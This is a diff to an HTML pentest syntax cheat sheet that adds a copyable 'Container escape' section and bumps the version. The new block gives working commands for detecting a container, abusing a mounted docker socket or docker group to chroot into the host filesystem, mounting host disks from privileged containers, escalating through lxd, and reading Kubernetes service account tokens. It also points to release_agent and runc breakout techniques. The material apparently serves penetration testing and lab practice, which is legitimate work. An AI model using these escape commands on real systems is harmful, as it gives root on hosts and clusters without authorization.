@@ -100,12 +100,12 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.1.0</span>
+  <span class="ver">v1.2.0</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
 <div class="layout">
-  <nav class="toc" id="toc" aria-label="Sections"><a href="#scope-and-tool-rules-read-this-first">Scope and tool rules (read this first)</a><a href="#port-scanning">Port scanning</a><a href="#ftp-21">FTP (21)</a><a href="#ssh-22">SSH (22)</a><a href="#smtp-25">SMTP (25)</a><a href="#dns-53">DNS (53)</a><a href="#web-80-443-8080">Web (80/443/8080/...)</a><a href="#smb-139-445">SMB (139/445)</a><a href="#snmp-161-udp">SNMP (161/udp)</a><a href="#ldap-389-636">LDAP (389/636)</a><a href="#databases">Databases</a><a href="#rdp-winrm">RDP / WinRM</a><a href="#active-directory-88-present-dc">Active Directory (88 present = DC)</a><a href="#reverse-shells">Reverse shells</a><a href="#upgrade-a-dumb-shell-to-a-full-tty">Upgrade a dumb shell to a full TTY</a><a href="#file-transfer">File transfer</a><a href="#privilege-escalation-first-moves">Privilege escalation, first moves</a><a href="#password-cracking">Password cracking</a><a href="#searchsploit">searchsploit</a><a href="#the-loop-to-run-on-every-box">The loop to run on every box</a></nav>
+  <nav class="toc" id="toc" aria-label="Sections"><a href="#scope-and-tool-rules-read-this-first">Scope and tool rules (read this first)</a><a href="#port-scanning">Port scanning</a><a href="#ftp-21">FTP (21)</a><a href="#ssh-22">SSH (22)</a><a href="#smtp-25">SMTP (25)</a><a href="#dns-53">DNS (53)</a><a href="#web-80-443-8080">Web (80/443/8080/...)</a><a href="#smb-139-445">SMB (139/445)</a><a href="#snmp-161-udp">SNMP (161/udp)</a><a href="#ldap-389-636">LDAP (389/636)</a><a href="#databases">Databases</a><a href="#rdp-winrm">RDP / WinRM</a><a href="#active-directory-88-present-dc">Active Directory (88 present = DC)</a><a href="#reverse-shells">Reverse shells</a><a href="#upgrade-a-dumb-shell-to-a-full-tty">Upgrade a dumb shell to a full TTY</a><a href="#file-transfer">File transfer</a><a href="#privilege-escalation-first-moves">Privilege escalation, first moves</a><a href="#container-escape">Container escape</a><a href="#password-cracking">Password cracking</a><a href="#searchsploit">searchsploit</a><a href="#the-loop-to-run-on-every-box">The loop to run on every box</a></nav>
   <article id="doc">
 <h1 id="pentest-syntax-cheat-sheet">Pentest syntax cheat sheet</h1>
 <p>Placeholders: <code>&lt;ip&gt;</code> target, <code>&lt;host&gt;</code> hostname/FQDN, <code>&lt;user&gt;</code> <code>&lt;pass&gt;</code> creds, <code>&lt;domain&gt;</code> AD domain, <code>&lt;lhost&gt;</code> your VPN IP, <code>&lt;lport&gt;</code> your listener port.</p>
@@ -274,6 +274,36 @@ crontab -l; cat /etc/crontab
 .\winpeas.exe
 whoami /priv                                  # look for SeImpersonate -&gt; potato
 systeminfo                                    # then windows-exploit-suggester</code></pre></div>
+<h2 id="container-escape">Container escape</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># am I in a container, and which runtime?
+ls -la /.dockerenv /run/.containerenv 2&gt;/dev/null   # docker / podman
+cat /proc/1/cgroup                                  # docker / lxc / kubepods
+env | grep -i KUBERNETES                            # a pod
+
+# enumerate the confinement (the escape is almost always one of these)
+capsh --print 2&gt;/dev/null; grep Cap /proc/self/status   # CAP_SYS_ADMIN / PTRACE / DAC_READ_SEARCH
+ls -la /var/run/docker.sock 2&gt;/dev/null             # mounted socket = game over
+mount; fdisk -l 2&gt;/dev/null                         # host mounts / privileged (sees host disks)
+id | grep -E &#x27;docker|lxd|lxc&#x27;                        # group membership is root-equivalent
+
+# docker socket or docker group -&gt; root on the host
+docker run -v /:/host -it alpine chroot /host bash
+
+# privileged container -&gt; mount the host disk
+mkdir /mnt/host; mount /dev/sda1 /mnt/host &amp;&amp; chroot /mnt/host bash
+
+# lxd group -&gt; privileged container mounting /
+lxc init esc r -c security.privileged=true
+lxc config device add r host disk source=/ path=/mnt/root recursive=true
+lxc start r; lxc exec r sh
+
+# kubernetes pod -&gt; node
+cat /run/secrets/kubernetes.io/serviceaccount/token
+kubectl auth can-i --list            # create pods -&gt; schedule a privileged hostPath pod
+
+# CAP_SYS_ADMIN (AppArmor off/permissive): cgroup release_agent break-out -&gt; HackTricks
+# CVE-2019-5736: overwrite host runc from inside, fires on the next &#x27;docker exec&#x27;
+# automation: ./deepce.sh   |   cdk evaluate --full</code></pre></div>
 <h2 id="password-cracking">Password cracking</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>hashcat -m &lt;mode&gt; hash.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
